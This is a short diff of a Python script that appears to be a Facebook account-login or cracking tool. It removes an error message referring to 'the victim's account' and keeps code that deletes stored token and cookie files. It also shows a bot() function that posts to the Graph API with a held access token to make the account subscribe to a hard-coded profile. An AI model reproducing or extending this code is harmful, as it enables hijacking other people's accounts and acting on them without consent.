@@ -155,8 +155,8 @@ def login_lagi334():
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s [×] log in failed, please check the victim's account 😡%s'%(x,k,x,m,x))
-		exit()
+
+
 def bot():
 	try:
 		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
